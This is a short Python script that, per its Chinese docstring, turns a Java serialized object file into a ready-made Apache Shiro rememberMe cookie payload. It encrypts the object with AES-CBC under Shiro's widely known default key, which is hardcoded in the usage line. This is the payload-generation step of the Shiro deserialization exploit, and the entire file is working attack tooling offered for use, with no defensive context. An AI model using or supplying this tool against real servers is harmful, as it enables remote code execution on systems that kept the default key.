"""
Usage:
	Python3 test.py kPH+bIxk5D2deZiIxcaaaA== urldns.ser
将序列化的文件转换为shiro直接利用的payload
"""
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
from uuid import uuid4
import sys

def get_serFile_Base64(filename):
	content = b""
	with open(filename,"rb") as f:
		for i in f.readlines():
			content += i
	return b64encode(content).decode()


def rememberMe(key, pd):
    BS, iv = [AES.block_size, uuid4().bytes]
    aes = AES.new(b64decode(key), AES.MODE_CBC, iv)
    padding = lambda s: s+((BS-len(s)%BS)*chr(BS-len(s)%BS)).encode()
    return b64encode(iv + aes.encrypt(padding(b64decode(pd)))).decode()
if len(sys.argv) == 3:
	key = sys.argv[1]
	filename = sys.argv[2]
	print("rememberMe="+rememberMe(key,get_serFile_Base64(filename)))
else:
	print("Usage：Python3 test.py key SerFile")
# print(rememberMe("kPH+bIxk5D2deZiIxcaaaA==",pd))
